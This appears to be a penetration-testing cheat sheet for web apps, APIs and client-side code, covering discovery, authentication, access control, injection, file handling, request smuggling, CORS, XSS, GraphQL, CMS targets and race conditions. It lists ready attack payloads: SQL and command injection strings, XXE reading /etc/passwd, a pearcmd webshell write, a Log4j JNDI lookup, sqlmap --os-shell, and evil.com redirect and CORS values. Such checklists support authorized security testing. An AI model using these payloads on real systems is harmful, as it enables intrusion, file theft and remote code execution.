# Web, API & Client-Side

## 1. Workflow

1. Map the app: routes, params, roles, API versions, auth flows, third parties.
2. Fingerprint: server, framework, WAF, CDN, CMS, JS libs.
3. Attack surface: content discovery, vhosts, params, hidden endpoints from JS.
4. Auth and session: registration, reset, MFA, JWT/OAuth/SAML, session lifetime.
5. Access control: IDOR/BOLA, BFLA, tenant isolation, mass assignment.
6. Injection and parsing: SQL/NoSQL/command/SSTI/SSRF/XXE/deserialization/LDAP.
7. Request-layer: host header, cache, smuggling, CORS, CSRF.
8. Client-side: XSS, prototype pollution, postMessage, DOM clobbering.
9. Business logic and race conditions.
10. Chain findings into impact.

## 2. Discovery

```bash
ffuf -u https://t/FUZZ -w raft-large-directories.txt -mc all -fc 404 -ac -t 100
feroxbuster -u https://t -w raft-medium-files.txt -x php,asp,aspx,jsp,json,js,bak,old,zip -C 404
gobuster vhost -u https://t -w subs.txt --append-domain

# Parameters
arjun -u https://t/api/endpoint -m GET,POST
cat urls.txt | grep '=' | unfurl keys | sort -u
ffuf -u 'https://t/api?FUZZ=1' -w params.txt -fs <baseline>

# JS analysis
subjs -i live.txt | tee js.txt
cat js.txt | while read u; do curl -s "$u"; done | grep -Eo '(https?://[^"'"'"' ]+|/api/[^"'"'"' ]+)' | sort -u
# sourcemaps: append .map, then pull original sources
# secrets: trufflehog filesystem . ; gitleaks detect
```

Wordlists: `/usr/share/seclists/Discovery/Web-Content/` (raft-*, directory-list-2.3-*, `api/`), `/usr/share/wordlists/`.

## 3. Authentication

**Login:** username enumeration via response diff/timing, default creds (`admin:admin`, `admin:password`), lockout policy, MFA bypass (response manipulation, code reuse, backup codes, push fatigue, OTP in response).

**Password reset:** host header injection in reset link, token predictability, token not invalidated, user-controlled `email`/`id` param, response leakage, race on token use.

**JWT:**
```bash
jwt_tool <token> -M at          # all tests
jwt_tool <token> -X a           # alg:none
jwt_tool <token> -C -d wordlist # crack HS256 secret
jwt_tool <token> -T              # tamper claims
```
Check: `alg` confusion RS256→HS256 with public key, `kid` path traversal/SQLi, `jku`/`x5u` pointing to attacker JWKS, weak secret, missing signature verification, claim trust (`role`, `sub`, `tenant`).

**OAuth/OIDC:** `redirect_uri` bypass (`@`, `//`, path traversal, subdomain, `javascript:`), missing `state` (CSRF), PKCE downgrade, implicit flow token leakage via referrer, mix-up attack, token in URL fragment, account linking without verification.

**SAML:** XML signature wrapping, comment injection in NameID, XXE in SAML, recipient/audience not validated, signature not required, RelayState open redirect.

## 4. Access control

- Enumerate object IDs across roles; swap numeric/UUID/GUID, compare responses.
- Try HTTP method swap (`GET`→`PUT`/`DELETE`/`PATCH`), content-type swap, version downgrade (`/v2/`→`/v1/`).
- Mass assignment: add `role`, `isAdmin`, `verified`, `tenantId`, `balance` to JSON bodies.
- BFLA: call admin endpoints with low-priv token; check only UI-level gating.
- Tenant isolation: change `X-Tenant-ID`, subdomain, JWT claim.
- Forced browsing to `/admin`, `/internal`, `/debug`, `/actuator`, `/.git/`.

## 5. Injection

| Class | Test | Notes |
| --- | --- | --- |
| SQLi | `'`, `"`, `')`, `--`, `AND 1=1`, `SLEEP(5)` | union, error, boolean, time, OOB via DNS (`LOAD_FILE`, `xp_dirtree`) |
| NoSQLi | `{"$ne":null}`, `{"$gt":""}`, `[$regex]` | Mongo operator injection in JSON |
| Command | `;id`, `\|id`, `$(id)`, backticks | blind via `sleep`, OOB via `curl`/`nslookup` |
| SSTI | `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}` | engine fingerprint → RCE payloads |
| SSRF | `http://127.0.0.1`, `http://169.254.169.254/`, `file://`, `gopher://` | decimal/IPv6/redirect bypass, DNS rebinding, blind via collaborator |
| XXE | `<!ENTITY x SYSTEM "file:///etc/passwd">` | OOB exfil, parameter entities, PHP filter chains |
| LDAP | `*)(uid=*`, `admin*` | auth bypass, blind |
| Deserialization | Java `rO0`, .NET `AAEAAAD`, PHP `O:`, Python pickle | ysoserial, ysoserial.net, phpggc |
| EL | `${...}` SpEL, `%{...}` OGNL | Spring, Struts |
| CRLF | `%0d%0aX-Test: 1` | response splitting, header injection |

```bash
sqlmap -r req.txt --batch --level 5 --risk 3 --dbms mssql --technique=BEUSTQ
sqlmap -u 'https://t/?id=1' --batch --tamper=space2comment,between --os-shell
commix --url='https://t/?cmd=1' --batch
dalfox url https://t/?q=1 --deep-domxss
```

## 6. File handling

**Upload:** extension bypass (`.php5`, `.phtml`, `.phar`, `.jspx`, `.asp;.jpg`, trailing dot/space, `%00`), content-type spoof, magic bytes, `.htaccess` upload, filename path traversal, image polyglot, SVG with script, zip slip on extract.

**LFI/RFI:**
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php   # filter chains -> RCE
/proc/self/environ, /proc/self/cmdline, /var/log/apache2/access.log
/var/lib/php/sessions/sess_<id>
data://text/plain;base64,...
expect://id
```
Log poisoning, session file poisoning, `pearcmd.php` via `?+config-create+/<?=system($_GET[1]);?>+/tmp/s.php`.

## 7. Request layer

- **Host header:** password reset poisoning, cache poisoning, routing SSRF, vhost bypass, `X-Forwarded-Host`.
- **Cache poisoning:** unkeyed headers (`X-Forwarded-Host`, `X-Original-URL`), cache deception (`/account/profile.css`), parameter cloaking.
- **Smuggling:** CL.TE, TE.CL, TE.TE, TE.0, H2.CL, H2.TE — use `http2smugl` / Burp's smuggler; target front-end/back-end disagreement.
- **CORS:** `Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`; null origin; regex bypass (`evil.com.target.com`, `target.com.evil.com`).
- **CSRF:** missing token, token not tied to session, `SameSite=None`, method override, JSON CSRF via form.
- **Open redirect:** `//evil.com`, `/\evil.com`, `https:evil.com`, `@`, encoded.
- **Subdomain takeover:** dangling CNAME to S3/Azure/GitHub/Heroku; verify before claiming.

## 8. Client-side

- **XSS:** context matters (HTML, attribute, JS string, URL, CSS). `dalfox` for reflection hunting, manual for stored/DOM.
- **CSP bypass:** JSONP endpoints, `script-src` whitelist takeover, `base-uri`, nonce reuse, dangling markup.
- **Prototype pollution:** `__proto__`, `constructor.prototype`; client → XSS via gadget, server → RCE/DoS.
- **postMessage:** missing `origin` check, `*` target, handler reachable cross-origin.
- **DOM clobbering:** `id`/`name` shadowing globals; `document.getElementById` confusion.
- **XS-Leaks:** timing, error events, frame counting, cache probing.

## 9. API

- REST: BOLA on every object, mass assignment, excessive data exposure, versioning, rate limits, API keys in JS.
- GraphQL: introspection (`{__schema{types{name}}}`), field-level authz, batching/aliasing brute force, depth DoS, mutation IDOR, `__typename` leaks.
```bash
graphql-cop -t https://t/graphql
# introspection off? try field suggestions, clairvoyance
```
- gRPC: `grpcurl -plaintext host:port list`, reflection, protobuf fuzzing.
- WebSocket: CSWSH (no origin check), authz per message, injection in frames.

## 10. CMS / framework quick wins

| Target | First moves |
| --- | --- |
| WordPress | `wpscan --url --enumerate ap,at,u`, plugin CVEs, xmlrpc brute, REST user enum, `wp-config` backup |
| Drupal | `droopescan`, Drupalgeddon2/3, `/user/register` RCE chains |
| Joomla | `joomscan`, component CVEs, `configuration.php~` |
| Tomcat | `/manager/html` default creds, `PUT` JSP, Ghostcat (CVE-2020-1938) |
| Jenkins | `/script` Groovy console, `/asynchPeople`, credentials plugin, agent-to-controller |
| Spring | `/actuator/env`, `/actuator/heapdump`, Spring4Shell, SpEL injection |
| Struts | OGNL injection, S2-045/S2-057 |
| Log4j | `${jndi:ldap://...}` in any logged header/param |
| Confluence/GitLab/Jira | version → known auth bypass / RCE |

## 11. Business logic & race

- Price/quantity tampering, negative values, currency swap, coupon stacking, refund abuse.
- Workflow bypass: skip steps, replay final step, state machine confusion.
- Race: single-packet attack (HTTP/2), parallel requests on coupon/redeem/transfer/vote.
```bash
# Turbo Intruder / single-packet; or
seq 1 30 | xargs -P 30 -I{} curl -s -o /dev/null -w '%{http_code}\n' https://t/redeem -d 'code=X'
```

## 12. Notes

- Always test both authenticated roles and anonymous.
- Diff responses byte-for-byte; small length changes reveal authz bugs.
- Save every raw request that produced a signal — reporting needs exact repro.
- WAF blocking? Try encoding, HTTP/2, case variation, param pollution, alternate content types.
